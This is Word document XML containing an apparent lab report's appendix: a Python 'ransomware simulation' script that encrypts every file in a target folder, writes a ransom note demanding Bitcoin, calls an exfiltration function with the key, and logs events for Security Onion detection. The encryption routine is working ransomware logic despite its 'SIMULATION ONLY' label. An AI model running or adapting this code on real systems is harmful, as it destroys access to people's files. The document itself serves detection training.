      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>os.listdir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">(target) </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>os.path.isfile</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os.path.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(target, f))]</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for </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">filename </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>files_in_dir</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>file_path</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os.path.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(target, filename)</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if </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">filename </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">in </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decrypt_key.key</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"README.txt"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continue</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>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file_size</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os.path.getsize</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file_path</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with </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>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file_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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rb</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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f:</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            data = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f.read</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enc_data</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cipher.encrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(data)</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with </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>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file_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>wb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f:</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f.write</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enc_data</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BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> += </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2AACB8"/>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f"FILE_ENCRYPTED</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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filename</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file_size</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B | SHA256_CHANGED"</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time.sleep</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0.3</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note_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>os.path.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">(target, </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>"README.txt"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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">with </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>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note_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>note:</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note.write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YOUR FILES HAVE BEEN ENCRYPTED </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note.write</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f"Attack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID: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note.write</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f"Time</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">: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datetime.now</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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>}\n\n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note.write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"Send 1 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</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note.write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SIMULATION ONLY </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f"RANSOM_NOTE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Created at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note_path</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"INFO"</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time.sleep</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1</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exfiltrate_data</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BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>key.decode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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20</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f"ATTACK_COMPLETE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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files | SUCCESS"</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"WARNING"</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70</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SIMULATION COMPLETE - </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encrypted_count</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files encrypted"</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Check Security Onion Kibana:"</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   Search: ATTACK_ID:</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>attack_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>70</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>}\n</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BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">except </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">Exception </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>send_to_syslog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f"ATTACK_FAILED</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> |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8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>type</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(e).</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="B200B2"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>__name__</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 xml:space="preserve">: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8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(e)</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 xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>"CRITICAL"</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BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>❌</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Error: </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BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63ED12CD" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC"/>
    <w:p w14:paraId="18F735B7" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:color w:val="383A42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Appendix A.1: Complete ransomware simulation script </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:color w:val="383A42"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="token"/>
          <w:color w:val="383A42"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED46EE4" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC"/>
    <w:p w14:paraId="16AF10A0" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:r>
        <w:t>Screenshot A.2: Complete Log Output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551D7DE6" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC"/>
    <w:p w14:paraId="6773CE19" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78EE00EC" wp14:editId="5DA668F3">
            <wp:extent cx="5940425" cy="637921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6379210"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
